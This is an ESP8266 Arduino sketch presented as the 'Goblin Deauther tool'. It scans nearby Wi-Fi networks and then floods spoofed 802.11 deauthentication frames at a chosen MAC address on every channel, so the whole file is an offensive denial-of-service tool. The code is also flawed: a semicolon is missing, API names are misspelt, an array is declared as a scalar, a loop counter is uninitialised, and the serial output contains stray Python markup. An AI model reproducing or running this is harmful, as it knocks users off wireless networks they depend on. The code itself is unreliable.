#include <ESP8266WiFi.h>
extern "C" {
	#include "user_interface.h"
}

uint8_t deauth_packet[26] = {
  0xC0, 0x00,             
  0x00, 0x00,             
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  
  0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC,  
  0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC,  
  0x00, 0x00,              
  0x07, 0x00           
}

void setup() {
	Serial.begin(115200);

	wifi_set_opmode(STATION_MODE);
	wifi_promiscous_enable(1);

	Serial.println("[bold green](#)[/] Welcome to Goblin Deauther tool!\n");
	Serial.println("1. Scan networks \n2. Attack network\n");

}

void loop() {
	if (Serial.avaliable() > 0) {
		String input = Serial.readStringUntil('\n');
		input.trim();

		if (input == "1") {
			scanNetworks();
		} else if (input == "2") {
			String target = Serial.readStringUntil('\n');
			startDeauth(target);
		}
	}
}

void startDeauth(String targetMAC) {
	Serial.println("($) Starting deauth attack on: " + targetMAC);
	uint8_t mac(6);
	sscanf(targetMAC.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
			&mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);

	memcpy(&deauth_packet[10], mac, 6);
	memcpy(&deauth_packet[16], mac, 6);
	memcpy(&deauth_packet[4], mac, 6);

	for (int channel = 1; channel <= 13; channel++) {
		wifi_set_channel(channel);

		Serial.println("(*) Channel: " + String(channel));

		for (int i = 0; i < 500; i++) {
			wifi_send_pkt_freedom(deauth_packet, 26, 0);
			delay(10);
		}
	}
}

void scanNetworks() {
	int n = WiFi.scanNetworks();
	for (int i; i < n; i++) {
		String mac = WiFi.BSSIDstr(i);
		Serial.println("[bold green]" + mac + "|" + WiFi.SSID(i) + "[/]");
	}
}